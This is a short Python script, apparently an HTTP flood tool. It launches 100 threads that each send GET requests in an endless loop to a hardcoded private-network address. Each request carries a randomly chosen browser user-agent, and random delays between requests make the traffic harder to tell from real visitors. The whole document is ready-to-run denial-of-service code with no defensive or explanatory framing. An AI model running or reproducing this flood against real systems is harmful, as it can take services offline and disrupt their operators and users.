import requests
from threading import Thread
import time
import random

# List of user-agent strings
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

target_url = "http://192.168.163.10"

def http_flood():
    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.get(target_url, headers=headers)
            print(f"[+] Success - Status Code: {response.status_code}")
        except Exception as e:
            print(f"[-] Failed - Error: {e}")
        time.sleep(random.uniform(0.1, 1.0))  # Random delay between requests

for _ in range(100):  # Number of threads
    Thread(target=http_flood).start()
